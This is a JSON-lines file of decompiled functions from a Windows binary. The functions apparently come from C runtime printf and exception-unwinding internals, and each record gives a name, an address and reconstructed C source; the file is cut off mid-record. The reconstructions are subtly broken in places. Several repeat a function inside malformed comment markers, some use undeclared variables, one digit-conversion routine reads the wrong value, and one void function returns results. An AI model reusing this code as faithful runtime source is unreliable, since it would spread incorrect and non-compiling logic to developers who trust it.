{"Function Name": "__local_unwind2", "Address": "1001b646", "Source Code": "void __cdecl __local_unwind2(int exception_structure, uint max_exception_index)\n{\n    uint current_exception_index;                \n    void *original_exception_list;           \n    undefined4 current_exception_handler;      \n    original_exception_list = exception_list; \n    exception_list = &original_exception_list; \n    while (true) {\n        current_exception_index = *(uint *)(exception_structure + 0xc); \n        if ((current_exception_index == 0xffffffff) || ((max_exception_index != 0xffffffff && (current_exception_index <= max_exception_index)))) break; \n        current_exception_handler = *(undefined4 *)(*(int *)(exception_structure + 8) + current_exception_index * 0xc); \n        *(undefined4 *)(exception_structure + 0xc) = current_exception_handler; \n        if (*(int *)(*(int *)(exception_structure + 8) + 4 + current_exception_index * 0xc) == 0) { \n            __NLG_Notify(0x101); \n            FUN_1001b71b(); \n        }\n    }\n    exception_list = original_exception_list; \n    return; \n}"}
{"Function Name": "__NLG_Notify", "Address": "1001b6fc", "Source Code": "void __NLG_Notify(ulong input_param)\n{\n    \n    global_param_storage_1 = input_param;\n    \n    global_param_storage_2 = eax_value;\n    \n    global_param_storage_3 = ebp_value;\n}"}
{"Function Name": "common_vsprintf_s<char>", "Address": "1001ba27", "Source Code": "\\*\nint __cdecl\ncommon_vsprintf_s<char>\n(__uint64 param_1, char *param_2, uint param_3, char *param_4, __crt_locale_pointers *param_5,\nchar *param_6)\n{\n    \n    if (param_4 == (char *)0x0) {\n        \n        *(undefined4 *)FUN_100253b8() = 0x16;\n        \n        FUN_1001de96();\n        return -1; \n    }\n    \n    \n    if (param_2 == (char *)0x0 || param_3 == 0) {\n        \n        *(undefined4 *)FUN_100253b8() = 0x16;\n    } else {\n        \n        int iVar2 = common_vsprintf<class___crt_stdio_output::format_validation_base,char>\n        (param_1, param_2, param_3, param_4, param_5, param_6);\n        \n        \n        if (iVar2 < 0) {\n            *param_2 = '\\0'; \n        }\n        \n        \n        if (iVar2 != -2) {\n            return iVar2; \n        }\n        \n        \n        *(undefined4 *)FUN_100253b8() = 0x22;\n    }\n    \n    \n    FUN_1001de96();\n    return -1; \n}\n*\\ \n \nint __cdecl\ncommon_vsprintf_s<char>\n(__uint64 param_1,char *param_2,uint param_3,char *param_4,__crt_locale_pointers *param_5,\nchar *param_6)\n{\n    if (param_4 == (char *)0x0) {\n        *(undefined4 *)FUN_100253b8() = 0x16;\n        FUN_1001de96();\n        return -1;\n    }\n    if (param_2 == (char *)0x0 || param_3 == 0) {\n        *(undefined4 *)FUN_100253b8() = 0x16;\n    } else {\n        int iVar2 = common_vsprintf<class___crt_stdio_output::format_validation_base,char>\n        (param_1,param_2,param_3,param_4,param_5,param_6);\n        if (iVar2 < 0) {\n            *param_2 = '\\0';\n        }\n        if (iVar2 != -2) {\n            return iVar2;\n        }\n        *(undefined4 *)FUN_100253b8() = 0x22;\n    }\n    FUN_1001de96();\n    return -1;\n}"}
{"Function Name": "common_vsprintf_s<wchar_t>", "Address": "1001ba9f", "Source Code": "\\*\nint __cdecl\ncommon_vsprintf_s<wchar_t>\n(__uint64 param_1,wchar_t *param_2,uint param_3,wchar_t *param_4,\n__crt_locale_pointers *param_5,char *param_6)\n{\n    undefined4 *puVar1; \n    int iVar2; \n    \n    if (param_4 == (wchar_t *)0x0) {\n        puVar1 = (undefined4 *)FUN_100253b8(); \n        *puVar1 = 0x16; \n        FUN_1001de96(); \n        return -1; \n    }\n    \n    \n    if (param_2 == (wchar_t *)0x0 || param_3 == 0) {\n        puVar1 = (undefined4 *)FUN_100253b8(); \n        *puVar1 = 0x16; \n    } else {\n        \n        iVar2 = common_vsprintf<class___crt_stdio_output::format_validation_base,wchar_t>\n        (param_1,param_2,param_3,param_4,param_5,param_6);\n        \n        \n        if (iVar2 < 0) {\n            *param_2 = L'\\0'; \n        }\n        \n        \n        if (iVar2 != -2) {\n            return iVar2; \n        }\n        \n        puVar1 = (undefined4 *)FUN_100253b8(); \n        *puVar1 = 0x22; \n    }\n    \n    FUN_1001de96(); \n    return -1; \n}\n*\\ \n \nint __cdecl\ncommon_vsprintf_s<wchar_t>\n(__uint64 param_1,wchar_t *param_2,uint param_3,wchar_t *param_4,\n__crt_locale_pointers *param_5,char *param_6)\n{\n    undefined4 *puVar1;\n    int iVar2;\n    if (param_4 == (wchar_t *)0x0) {\n        puVar1 = (undefined4 *)FUN_100253b8();\n        *puVar1 = 0x16;\n        FUN_1001de96();\n        return -1;\n    }\n    if (param_2 == (wchar_t *)0x0 || param_3 == 0) {\n        puVar1 = (undefined4 *)FUN_100253b8();\n        *puVar1 = 0x16;\n    } else {\n        iVar2 = common_vsprintf<class___crt_stdio_output::format_validation_base,wchar_t>\n        (param_1,param_2,param_3,param_4,param_5,param_6);\n        if (iVar2 < 0) {\n            *param_2 = L'\\0';\n        }\n        if (iVar2 != -2) {\n            return iVar2;\n        }\n        puVar1 = (undefined4 *)FUN_100253b8();\n        *puVar1 = 0x22;\n    }\n    FUN_1001de96();\n    return -1;\n}"}
{"Function Name": "FUN_1001bc7d", "Address": "1001bc7d", "Source Code": "void __thiscall FUN_1001bc7d(void *this, uint inputValue, uint baseValue, char isUpperCase)\n{\n    uint charCount; \n    char currentChar; \n    formatting_buffer *formattingBufferPtr = *(formatting_buffer **)((int)this + 0x444); \n    \n    if (formattingBufferPtr == (formatting_buffer *)0x0) {\n        \n        formattingBufferPtr = (formatting_buffer *)((int)this + 0x40);\n    }\n    \n    \n    charCount = __crt_stdio_output::formatting_buffer::count<char>((formatting_buffer *)((int)this + 0x40));\n    \n    *(formatting_buffer **)((int)this + 0x34) = formattingBufferPtr + (charCount - 1);\n    \n    \n    while ((0 < *(int *)((int)this + 0x28) || (inputValue != 0))) {\n        \n        currentChar = (char)(inputValue % baseValue) + '0';\n        \n        *(int *)((int)this + 0x28) = *(int *)((int)this + 0x28) - 1;\n        \n        \n        if ('9' < currentChar) {\n            currentChar += ((isUpperCase == '\\0') - 1U & 0xe0) + 0x27;\n        }\n        \n        \n        **(char **)((int)this + 0x34) = currentChar;\n        \n        *(int *)((int)this + 0x34) = *(int *)((int)this + 0x34) - 1;\n        \n        inputValue /= baseValue;\n    }\n    \n    \n    *(int *)((int)this + 0x38) = (int)(formattingBufferPtr + (charCount - 1)) - *(int *)((int)this + 0x34);\n    \n    *(int *)((int)this + 0x34) = *(int *)((int)this + 0x34) + 1;\n}"}
{"Function Name": "FUN_1001bcef", "Address": "1001bcef", "Source Code": "void __thiscall FUN_1001bcef(void *this, uint inputParam1, uint inputParam2, char inputParam3)\n{\n    uint intermediateResult; \n    int stateValue;  \n    \n    stateValue = *(int *)((int)this + 0x444);\n    \n    \n    if (stateValue == 0) {\n        stateValue = (int)this + 0x40; \n    }\n    \n    \n    intermediateResult = FUN_1001bb31((int)this + 0x40);\n    \n    \n    stateValue += intermediateResult * 2 - 2;\n    \n    \n    *(int *)((int)this + 0x34) = stateValue;\n    \n    while ((0 < *(int *)((int)this + 0x28) || (inputParam1 != 0))) {\n        *(int *)((int)this + 0x28) -= 1; \n        \n        \n        intermediateResult = inputParam1 % inputParam2 + 0x30 & 0xffff;\n        \n        \n        if (0x39 < intermediateResult) {\n            intermediateResult = (uint)(ushort)(short)(char)(((inputParam3 == '\\0') - 1U & 0xe0) + 0x27 + (char)intermediateResult);\n        }\n        \n        \n        **(short **)((int)this + 0x34) = (short)(char)intermediateResult;\n        \n        \n        *(int *)((int)this + 0x34) -= 2;\n        \n        \n        inputParam1 /= inputParam2;\n    }\n    \n    \n    *(int *)((int)this + 0x38) = stateValue - *(int *)((int)this + 0x34) >> 1;\n    \n    \n    *(int *)((int)this + 0x34) += 2;\n    \n    return; \n}"}
{"Function Name": "FUN_1001bd75", "Address": "1001bd75", "Source Code": "void __thiscall FUN_1001bd75(void *this,longlong inputParam,uint divisor,char flag)\n{\n    uint characterCount; \n    char processedChar; \n    formatting_buffer *formattingBufferPtr; \n    \n    formattingBufferPtr = *(formatting_buffer **)((int)this + 0x444);\n    if (formattingBufferPtr == (formatting_buffer *)0x0) {\n        formattingBufferPtr = (formatting_buffer *)((int)this + 0x40);\n    }\n    \n    \n    characterCount = __crt_stdio_output::formatting_buffer::count<char>((formatting_buffer *)((int)this + 0x40));\n    \n    \n    *(formatting_buffer **)((int)this + 0x34) = formattingBufferPtr + (characterCount - 1);\n    \n    \n    while (true) {\n        \n        if ((*(int *)((int)this + 0x28) < 1) && (inputParam == 0)) break;\n        \n        \n        *(int *)((int)this + 0x28) = *(int *)((int)this + 0x28) - 1;\n        \n        \n        inputParam = __aulldvrm((uint)inputParam, (uint)((ulonglong)inputParam >> 0x20), divisor, 0);\n        \n        \n        processedChar = (char)(*(char *)((int)this + 0x34) + '0');\n        \n        \n        if ('9' < processedChar) {\n            processedChar += ((flag == '\\0') - 1U & 0xe0) + 0x27;\n        }\n        \n        \n        **(char **)((int)this + 0x34) = processedChar;\n        \n        \n        *(int *)((int)this + 0x34) = *(int *)((int)this + 0x34) - 1;\n    }\n    \n    \n    *(int *)((int)this + 0x38) = (int)(formattingBufferPtr + (characterCount - 1)) - *(int *)((int)this + 0x34);\n    \n    \n    *(int *)((int)this + 0x34) = *(int *)((int)this + 0x34) + 1;\n    \n    return; \n}"}
{"Function Name": "FUN_1001bdfc", "Address": "1001bdfc", "Source Code": "void __thiscall FUN_1001bdfc(void *this,longlong inputParam,uint divisorParam,char charParam)\n{\n    uint intermediateUnsignedInt; \n    int intermediateInt;  \n    intermediateInt = *(int *)((int)this + 0x444); \n    if (intermediateInt == 0) { \n        intermediateInt = (int)this + 0x40; \n    }\n    intermediateUnsignedInt = FUN_1001bb31((int)this + 0x40); \n    intermediateInt += intermediateUnsignedInt * 2 - 2; \n    *(int *)((int)this + 0x34) = intermediateInt; \n    while (true) { \n        if ((*(int *)((int)this + 0x28) < 1) && (inputParam == 0)) break; \n        *(int *)((int)this + 0x28) -= 1; \n        inputParam = __aulldvrm((uint)inputParam, (uint)((ulonglong)inputParam >> 0x20), divisorParam, 0); \n        intermediateUnsignedInt = (*(int *)((int)this + 0x28) + 0x30U) & 0xffff; \n        if (0x39 < intermediateUnsignedInt) { \n            intermediateUnsignedInt = (uint)(ushort)(short)(char)(((charParam == '\\0') - 1U & 0xe0) + 0x27 + (char)intermediateUnsignedInt); \n        }\n        **(short **)((int)this + 0x34) = (short)(char)intermediateUnsignedInt; \n        *(int *)((int)this + 0x34) -= 2; \n    }\n    *(int *)((int)this + 0x38) = intermediateInt - *(int *)((int)this + 0x34) >> 1; \n    *(int *)((int)this + 0x34) += 2; \n    return; \n}"}
{"Function Name": "FUN_1001bfff", "Address": "1001bfff", "Source Code": "\\*\n__acrt_ptd ** __thiscall FUN_1001bfff(void *this, __acrt_ptd **inputParam)\n{\n    uint uintValue; \n    __acrt_ptd *ptrToAcrtPtd; \n    *(undefined *)((int)this + 0xc) = 0; \n    if (inputParam == (__acrt_ptd **)0x0) { \n        if (DAT_1005007c != 0) { \n            ptrToAcrtPtd = FUN_10029224(); \n            *(__acrt_ptd **)this = ptrToAcrtPtd; \n            *(int *)((int)this + 4) = *(int *)(ptrToAcrtPtd + 0x4c); \n            *(int *)((int)this + 8) = *(int *)(ptrToAcrtPtd + 0x48); \n            ___acrt_update_locale_info((int)ptrToAcrtPtd, (int *)((int)this + 4)); \n            FUN_10029498(*this, (int *)((int)this + 8)); \n            uintValue = *(uint *)(*this + 0x350); \n            if ((uintValue & 2) != 0) { \n                return (__acrt_ptd **)this; \n            }\n            *(uint *)(*this + 0x350) = uintValue | 2; \n            *(undefined *)((int)this + 0xc) = 1; \n            return (__acrt_ptd **)this; \n        }\n        *(__acrt_ptd **)((int)this + 4) = PTR_PTR_DAT_1004e2a8; \n        ptrToAcrtPtd = (__acrt_ptd *)PTR_DAT_1004e2ac; \n    } else {\n        *(__acrt_ptd **)((int)this + 4) = *inputParam; \n        ptrToAcrtPtd = inputParam[1]; \n    }\n    *(__acrt_ptd **)((int)this + 8) = ptrToAcrtPtd; \n    return (__acrt_ptd **)this; \n}\n*\\ \n \n__acrt_ptd ** __thiscall FUN_1001bfff(void *this,__acrt_ptd **inputParam)\n{\nuint uintValue;\n__acrt_ptd *ptrToAcrtPtd;\n*(undefined *)((int)this + 0xc) = 0;\nif (inputParam == (__acrt_ptd **)0x0) {\n    if (DAT_1005007c != 0) {\n        ptrToAcrtPtd = FUN_10029224();\n        *(__acrt_ptd **)this = ptrToAcrtPtd;\n        *(int *)((int)this + 4) = *(int *)(ptrToAcrtPtd + 0x4c);\n        *(int *)((int)this + 8) = *(int *)(ptrToAcrtPtd + 0x48);\n        ___acrt_update_locale_info((int)ptrToAcrtPtd,(int *)((int)this + 4));\n        FUN_10029498(*this,(int *)((int)this + 8));\n        uintValue = *(uint *)(*this + 0x350);\n        if ((uintValue & 2) != 0) {\n            return (__acrt_ptd **)this;\n        }\n        *(uint *)(*this + 0x350) = uintValue | 2;\n        *(undefined *)((int)this + 0xc) = 1;\n        return (__acrt_ptd **)this;\n    }\n    *(__acrt_ptd **)((int)this + 4) = PTR_PTR_DAT_1004e2a8;\n    ptrToAcrtPtd = (__acrt_ptd *)PTR_DAT_1004e2ac;\n} else {\n    *(__acrt_ptd **)((int)this + 4) = *inputParam;\n    ptrToAcrtPtd = inputParam[1];\n}\n*(__acrt_ptd **)((int)this + 8) = ptrToAcrtPtd;\nreturn (__acrt_ptd **)this;\n}"}
{"Function Name": "find_next_state", "Address": "1001c117", "Source Code": "byte find_next_state(char input_char, int index)\n{\n    \n    if ((byte)(input_char - 0x20U) < 0x5b) {\n        \n        \n        \n        \n        return (byte)(&data_array)[index + ((byte)\" Class Hierarchy Descriptor\\'\"[input_char + 0x1c] & 0xf) * 9] >> 4;\n    }\n    \n    return 0;\n}"}
{"Function Name": "find_next_state", "Address": "1001c14c", "Source Code": "byte find_next_state(ushort input_char, int index)\n{\n    \n    if ((ushort)(input_char - 0x20) < 0x5b) {\n        \n        \n        return (byte)(&data_array)[index + ((byte)\" Class Hierarchy Descriptor\\'\"[input_char + 0x1c] & 0xf) * 9] >> 4;\n    }\n    \n    return 0;\n}"}
{"Function Name": "FUN_1001c1df", "Address": "1001c1df", "Source Code": "uint __thiscall FUN_1001c1df(void *this,long *param_1)\n{\n    int *intPointer; \n    int value;   \n    __acrt_ptd *threadLocalData; \n    long convertedLong;  \n    uint returnValue;  \n    int *localPointer; \n    \n    if (*(int *)((int)this + 0xc) == 0) {\n        threadLocalData = FUN_100253b8(); \n        *(__acrt_ptd **)((int)this + 0xc) = threadLocalData; \n    }\n    \n    intPointer = *(int **)((int)this + 0xc); \n    value = *intPointer; \n    *intPointer = 0; \n    \n    \n    convertedLong = _strtol((char *)(*(int *)((int)this + 0x10) + -1),(char **)&localPointer,10);\n    *param_1 = convertedLong; \n    \n    if (*(int *)((int)this + 0xc) == 0) {\n        threadLocalData = FUN_100253b8(); \n        *(__acrt_ptd **)((int)this + 0xc) = threadLocalData; \n    }\n    \n    intPointer = *(int **)((int)this + 0xc); \n    \n    if ((**(int **)((int)this + 0xc) == 0x22) || (localPointer < *(int **)((int)this + 0x10))) {\n        returnValue = (uint)localPointer & 0xffffff00; \n    } else {\n        *(int **)((int)this + 0x10) = localPointer; \n        returnValue = CONCAT31((int3)((uint)localPointer >> 8),1); \n    }\n    \n    \n    if ((*intPointer == 0) && (value != 0)) {\n        *intPointer = value; \n    }\n    \n    return returnValue; \n}"}
{"Function Name": "FUN_1001c257", "Address": "1001c257", "Source Code": "uint __thiscall FUN_1001c257(void *this,long *param_1)\n{\n    int *intPointer; \n    int intValue;   \n    __acrt_ptd *threadDataPointer; \n    long longValue;  \n    uint unsignedIntValue;  \n    \n    if (*(int *)((int)this + 0xc) == 0) {\n        \n        threadDataPointer = FUN_100253b8();\n        \n        *(__acrt_ptd **)((int)this + 0xc) = threadDataPointer;\n    }\n    \n    \n    intPointer = *(int **)((int)this + 0xc);\n    \n    intValue = *intPointer;\n    \n    *intPointer = 0;\n    \n    \n    longValue = _wcstol((wchar_t *)(*(int *)((int)this + 0x10) + -2),(wchar_t **)&local_8,10);\n    \n    *param_1 = longValue;\n    \n    if (*(int *)((int)this + 0xc) == 0) {\n        \n        threadDataPointer = FUN_100253b8();\n        \n        *(__acrt_ptd **)((int)this + 0xc) = threadDataPointer;\n    }\n    \n    \n    intPointer = *(int **)((int)this + 0xc);\n    \n    \n    if ((**(int **)((int)this + 0xc) == 0x22) || (local_8 < *(int **)((int)this + 0x10))) {\n        \n        unsignedIntValue = (uint)local_8 & 0xffffff00;\n    } else {\n        \n        *(int **)((int)this + 0x10) = local_8;\n        \n        unsignedIntValue = CONCAT31((int3)((uint)local_8 >> 8), 1);\n    }\n    \n    \n    if ((*intPointer == 0) && (intValue != 0)) {\n        \n        *intPointer = intValue;\n    }\n    \n    \n    return unsignedIntValue;\n}"}
{"Function Name": "process", "Address": "1001c3f9", "Source Code": "undefined4 __fastcall process(__uint64 *param_1)\n{\n    bool isValid; \n    byte nextState; \n    char resultChar; \n    undefined4 *errorPtr; \n    uint sizeResult; \n    undefined4 stateResult; \n    int currentState; \n    \n    isValid = __crt_strtox::c_string_character_source<wchar_t>::validate((c_string_character_source<wchar_t> *)(param_1 + 0x89));\n    if (!isValid) { \n        return 0xffffffff; \n    }\n    \n    \n    if (*(int *)(param_1 + 2) == 0) {\n        errorPtr = (undefined4 *)FUN_100253b8(); \n        *errorPtr = 0x16; \n        FUN_1001de96(); \n    } else {\n        do {\n            \n            *(int *)(param_1 + 0x8a) = *(int *)(param_1 + 0x8a) + 1;\n            if (*(int *)(param_1 + 0x8a) == 2) { \n                return *(undefined4 *)(param_1 + 3); \n            }\n            *(undefined4 *)(param_1 + 7) = 0; \n            *(undefined4 *)((int)param_1 + 0x1c) = 0; \n            \n            short sVar1 = **(short **)(param_1 + 2);\n            *(short *)((int)param_1 + 0x32) = sVar1; \n            if (sVar1 != 0) { \n                *(int *)(param_1 + 2) = *(int *)(param_1 + 2) + 2; \n                if (*(int *)(param_1 + 3) < 0) goto LAB_1001c4de; \n                nextState = find_next_state(*(ushort *)((int)param_1 + 0x32), *(int *)((int)param_1 + 0x1c)); \n                currentState = (int)nextState; \n                *(int *)((int)param_1 + 0x1c) = currentState; \n                if (currentState == 8) goto LAB_1001c41e; \n                \n                switch(currentState) {\n                    case 0:\n                        stateResult = state_case_normal((int)param_1); \n                        resultChar = (char)stateResult; \n                        break;\n                    case 1:\n                        *(undefined4 *)(param_1 + 5) = 0xffffffff; \n                        goto LAB_1001c4c7; \n                    case 2:\n                        stateResult = state_case_flag((int)param_1); \n                        resultChar = (char)stateResult; \n                        break;\n                    case 3:\n                        stateResult = state_case_width(param_1); \n                        resultChar = (char)stateResult; \n                        break;\n                    case 5:\n                        stateResult = state_case_precision(param_1); \n                        resultChar = (char)stateResult; \n                        break;\n                    case 6:\n                        sizeResult = state_case_size(param_1); \n                        resultChar = (char)sizeResult; \n                        break;\n                    case 7:\n                        resultChar = FUN_1001cbed(param_1); \n                        break;\n                    default:\n                        goto LAB_1001c503; \n                }\n                if (resultChar == '\\0') { \n                    return 0xffffffff; \n                }\n                goto LAB_1001c4c7; \n            }\n            *(int *)(param_1 + 2) = *(int *)(param_1 + 2) + 2; \nLAB_1001c4de:\n            stateResult = validate_and_update_state_at_end_of_format_string((int)param_1); \n        } while ((char)stateResult != '\\0'); \n    }\nLAB_1001c503:\n    return 0xffffffff; \nLAB_1001c41e:\n    errorPtr = (undefined4 *)FUN_100253b8(); \n    *errorPtr = 0x16; \n    FUN_1001de96(); \n}"}
{"Function Name": "state_case_normal_tchar", "Address": "1001c626", "Source Code": "uint __fastcall state_case_normal_tchar(int input_param)\n{\n    uint return_value; \n    undefined *pointer_to_undefined; \n    *(undefined *)(input_param + 0x3c) = 0; \n    pointer_to_undefined = *(undefined **)**(undefined4 **)(input_param + 8); \n    if ((*(ushort *)(pointer_to_undefined + (uint)*(byte *)(input_param + 0x31) * 2) & 0x8000) != 0) { \n        __crt_stdio_output::string_output_adapter<char_value>::write_character \n        ((string_output_adapter<char_value> *)(input_param + 0x448), *(byte *)(input_param + 0x31), \n        (int *)(input_param + 0x18)); \n        *(undefined *)(input_param + 0x31) = **(undefined **)(input_param + 0x10); \n        pointer_to_undefined = *(undefined **)(input_param + 0x10) + 1; \n        *(undefined **)(input_param + 0x10) = pointer_to_undefined; \n        if (*(char *)(input_param + 0x31) == '\\0') { \n            *(undefined4 *)FUN_100253b8() = 0x16; \n            return_value = FUN_1001de96(); \n            return return_value & 0xffffff00; \n        }\n    }\n    return CONCAT31((int3)((uint)pointer_to_undefined >> 8), 1); \n}"}
{"Function Name": "FUN_1001c9bd", "Address": "1001c9bd", "Source Code": "uint __fastcall FUN_1001c9bd(__uint64 *param_1)\n{\n    uint characterValue; \n    char character; \n    undefined4 localValue; \n    characterValue = (uint)*(char *)((int)param_1 + 0x31); \n    localValue = param_1; \n    if ((int)characterValue < 0x65) { \n        if (characterValue == 100) { \n            *(uint *)(param_1 + 4) |= 0x10; \n            characterValue = 10; \n        } else if ((int)characterValue < 0x59) { \n            if (characterValue == 0x58) { \n                characterValue = 0x10; \n            } else if (characterValue == 0x41) { \n                goto LAB_1001ca7e; \n            } else if (characterValue == 0x43) { \n                goto LAB_1001ca2e; \n            } else if ((int)characterValue < 0x45) { \n                goto LAB_1001ca12; \n            } else if (0x47 < (int)characterValue) { \n                if (characterValue == 0x53) { \n                    goto LAB_1001ca03; \n                }\n                goto LAB_1001ca12; \n            }\n            characterValue = type_case_a((uint *)param_1); \n        } else if (characterValue == 0x5a) { \n            characterValue = type_case_Z(param_1); \n        } else {\n            characterValue = (characterValue == 0x61) ? characterValue : characterValue - 99; \n            if (characterValue != 0) { \n                goto LAB_1001ca12; \n            }\n            characterValue = type_case_c_tchar(param_1); \n        }\n    } else if ((int)characterValue < 0x71) { \n        if (characterValue == 0x70) { \n            characterValue = FUN_1001d70a(param_1); \n        } else if ((int)characterValue < 0x68) { \n            goto LAB_1001ca7e; \n        } else if (characterValue == 0x69) { \n            goto LAB_1001ca6e; \n        } else if (characterValue == 0x6e) { \n            characterValue = type_case_n((int)param_1); \n        } else if (characterValue == 0x6f) { \n            characterValue = type_case_o(param_1); \n        } else {\n            goto LAB_1001ca12; \n        }\n    } else {\n        if (characterValue != 0x73) { \n            if (characterValue != 0x75) { \n                characterValue = characterValue - 0x78; \n                if (characterValue != 0) { \n                    goto LAB_1001ca12; \n                }\n                goto LAB_1001ca1a; \n            }\n            *(uint *)(param_1 + 4) |= 0x10; \n        }\n        characterValue = type_case_s(param_1); \n    }\n    if ((char)characterValue != '\\0') { \n        if (*(char *)(param_1 + 6) == '\\0') { \n            uint fourthElement = *(uint *)(param_1 + 4); \n            localValue = (__uint64 *)((uint)localValue & 0xff000000); \n            int index = 0; \n            if (fourthElement >> 4 & 1) { \n                index = 1; \n                if ((fourthElement >> 6 & 1) == 0) { \n                    if ((fourthElement & 1) == 0) { \n                        index = 0; \n                        if (fourthElement >> 1 & 1) { \n                            localValue = (__uint64 *)CONCAT31(localValue._1_3_, 0x20); \n                        }\n                    } else {\n                        localValue = (__uint64 *)CONCAT31(localValue._1_3_, 0x2b); \n                    }\n                } else {\n                    localValue = (__uint64 *)CONCAT31(localValue._1_3_, 0x2d); \n                }\n            }\n        }\n        character = *(char *)((int)param_1 + 0x31); \n        if (((character != 'x') && (character != 'X')) || ((*(uint *)(param_1 + 4) >> 5 & 1) == 0)) { \n            calculatedValue = 0; \n        }\n        if ((character == 'a') || (character == 'A')) { \n            isAFlag = true; \n        } else {\n            isAFlag = false; \n        }\n        if ((char)calculatedValue != '\\0' || isAFlag) { \n            *(undefined *)((int)&localValue + index) = 0x30; \n            *(byte *)((int)&localValue + index + 1) = (!isAFlag - 1U & 0xe0) + 0x78; \n            index += 2; \n        }\n        calculatedValue = (*(int *)((int)param_1 + 0x24) - *(int *)(param_1 + 7)) - index; \n        if ((characterValue & 0xc) == 0) { \n            __crt_stdio_output::write_multiple_characters<class___crt_stdio_output::string_output_adapter<char>,char>((string_output_adapter<char> *)(param_1 + 0x89), ' ', calculatedValue, (int *)(param_1 + 3)); \n        }\n        __crt_stdio_output::string_output_adapter<char>::write_string((string_output_adapter<char> *)(param_1 + 0x89), (char *)&localValue, index, (int *)(param_1 + 3), (__crt_deferred_errno_cache *)((int)param_1 + 0xc)); \n        if (((*(uint *)(param_1 + 4) >> 3 & 1) != 0) && ((*(uint *)(param_1 + 4) >> 2 & 1) == 0)) { \n            __crt_stdio_output::write_multiple_characters<class___crt_stdio_output::string_output_adapter<char>,char>((string_output_adapter<char> *)(param_1 + 0x89), '0', calculatedValue, (int *)(param_1 + 3)); \n        }\n        __uint64 *storedStringPointer = (__uint64 *)write_stored_string_tchar((int)param_1); \n        if ((-1 < *(int *)(param_1 + 3)) && ((*(uint *)(param_1 + 4) >> 2) & 1)) { \n            __crt_stdio_output::write_multiple_characters<class___crt_stdio_output::string_output_adapter<char>,char>((string_output_adapter<char> *)(param_1 + 0x89), ' ', calculatedValue, (int *)(param_1 + 3)); \n        }\n        return CONCAT31((int3)((uint)storedStringPointer >> 8), 1); \n    }\n    return CONCAT31((int3)(characterValue >> 8), 1); \nLAB_1001ca12:\n    return characterValue & 0xffffff00; \n}"}
{"Function Name": "FUN_1001cbed", "Address": "1001cbed", "Source Code": "void __fastcall FUN_1001cbed(__uint64 *param_1)\n{\n    short sVar2; \n    char cVar5; \n    undefined4 uVar6; \n    int iVar7; \n    ushort uVar8; \n    uint uVar10; \n    uint local_8; \n    \n    local_8 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    iVar7 = 0; \n    uVar8 = *(ushort *)((int)param_1 + 0x32); \n    \n    if (uVar8 < 0x65) {\n        if (uVar8 == 100) { \n            *(uint *)(param_1 + 4) = *(uint *)(param_1 + 4) | 0x10; \n            cVar5 = '\\0'; \n            uVar10 = 10; \n        }\n        else if (uVar8 < 0x59) { \n            if (uVar8 == 0x58) { \n                cVar5 = '\\x01'; \n                uVar10 = 0x10; \n            }\n            else if (uVar8 == 0x41) { \n                goto LAB_1001ccbc; \n            }\n            else if (uVar8 == 0x43) { \n                goto LAB_1001cc6c; \n            }\n            else if (uVar8 < 0x45) { \n                goto LAB_1001ccbc; \n            }\n            else if (uVar8 == 0x53) { \n                goto LAB_1001cc40; \n            }\n            else {\n                goto LAB_1001ccbc; \n            }\n        }\n        else if (uVar8 == 0x5a) { \n            uVar6 = type_case_Z(param_1); \n            cVar5 = (char)uVar6; \n        }\n        else {\n            if (uVar8 == 0x61) { \n                goto LAB_1001ccbc; \n            }\n            if (uVar8 != 99) { \n                goto LAB_1001ce3b; \n            }\n            LAB_1001cc6c: \n            uVar6 = type_case_c_tchar(param_1); \n            cVar5 = (char)uVar6; \n        }\n    }\n    else if (uVar8 < 0x71) { \n        if (uVar8 == 0x70) { \n            cVar5 = FUN_1001d722(param_1); \n        }\n        else if (uVar8 < 0x68) { \n            goto LAB_1001ccbc; \n        }\n        else if (uVar8 == 0x69) { \n            *(uint *)(param_1 + 4) = *(uint *)(param_1 + 4) | 0x10; \n            cVar5 = '\\0'; \n            uVar10 = 10; \n        }\n        else if (uVar8 == 0x6e) { \n            uVar10 = type_case_n((int)param_1); \n            cVar5 = (char)uVar10; \n        }\n        else {\n            if (uVar8 != 0x6f) { \n                goto LAB_1001ce3b; \n            }\n            cVar5 = type_case_o(param_1); \n        }\n    }\n    else { \n        if (uVar8 != 0x73) { \n            if (uVar8 != 0x75) { \n                if (uVar8 != 0x78) { \n                    goto LAB_1001ce3b; \n                }\n                cVar5 = '\\0'; \n                uVar10 = 0x10; \n            }\n            else { \n                *(uint *)(param_1 + 4) = *(uint *)(param_1 + 4) | 0x10; \n                cVar5 = '\\0'; \n                uVar10 = 10; \n            }\n        }\n        LAB_1001cc40: \n        uVar6 = type_case_s(param_1); \n        cVar5 = (char)uVar6; \n    }\n    \n    if ((cVar5 == '\\0') || (*(char *)(param_1 + 6) != '\\0')) goto LAB_1001ce3b; \n    uVar10 = *(uint *)(param_1 + 4); \n    \n    if ((uVar10 >> 4 & 1) != 0) { \n        if ((uVar10 >> 6 & 1) == 0) { \n            if ((uVar10 & 1) == 0) { \n                if ((uVar10 >> 1 & 1) == 0) goto LAB_1001cd3a; \n                uVar8 = 0x20; \n            }\n            else {\n                uVar8 = 0x2b; \n            }\n        }\n        else {\n            uVar8 = 0x2d; \n        }\n        iVar7 = 1; \n    }\n    LAB_1001cd3a: \n    sVar2 = *(short *)((int)param_1 + 0x32); \n    bool bVar3 = (sVar2 == 0x78 || sVar2 == 0x58) && ((uVar10 >> 5 & 1) != 0); \n    bool bVar4 = (sVar2 == 0x61 || sVar2 == 0x41); \n    \n    if (bVar3 || bVar4) {\n        *(short *)((int)&uVar10 + iVar7 * 2) = 0x30; \n        if (sVar2 == 0x58 || sVar2 == 0x41) { \n            bVar3 = true; \n        }\n        *(short *)((int)&uVar10 + iVar7 * 2 + 2) = (short)(char)((!bVar3 - 1U & 0xe0) + 0x78); \n        iVar7 += 2; \n    }\n    int iVar9 = (*(int *)((int)param_1 + 0x24) - *(int *)(param_1 + 7)) - iVar7; \n    if ((uVar10 & 0xc) == 0) { \n        __crt_stdio_output::\n        write_multiple_characters<class___crt_stdio_output::string_output_adapter<wchar_t>,char>\n        ((string_output_adapter<wchar_t> *)(param_1 + 0x89), ' ', iVar9, (int *)(param_1 + 3)); \n    }\n    __crt_stdio_output::string_output_adapter<wchar_t>::write_string\n    ((string_output_adapter<wchar_t> *)(param_1 + 0x89), (wchar_t *)&uVar10, iVar7,\n    (int *)(param_1 + 3), (__crt_deferred_errno_cache *)((int)param_1 + 0xc)); \n    \n    if (((*(uint *)(param_1 + 4) >> 3 & 1) != 0) && ((*(uint *)(param_1 + 4) >> 2 & 